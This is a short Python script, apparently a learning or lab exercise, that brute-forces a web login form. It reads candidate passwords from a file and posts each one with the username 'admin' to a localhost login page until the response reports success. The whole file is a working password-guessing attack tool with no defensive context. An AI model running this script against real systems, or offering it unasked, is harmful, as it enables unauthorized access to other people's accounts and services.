import requests

'''
Description:
This script attempts to brute-force a login form by trying a list of passwords against a given username.
'''

# Setup parameters
url = "http://localhost/login.php" # Url addres of a server with login form
username = "admin"
password_file = "passwords.txt"  # File with passwords to test

#Reading passwords from file
try:
    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"Eror: file '{password_file}' does not exists.")
    exit()

#Testing passwords, by sending POST requests with each password in place of the password field
for password in passwords:
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(url, data=data)
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        break

    # Checking if the response indicates a successful login
    if "Login successful" in response.text:
        print(f"Password found: {password}")
        break
    else:
        print(f": {password}")
else:
    print("None of the passwords in the file is correct.")
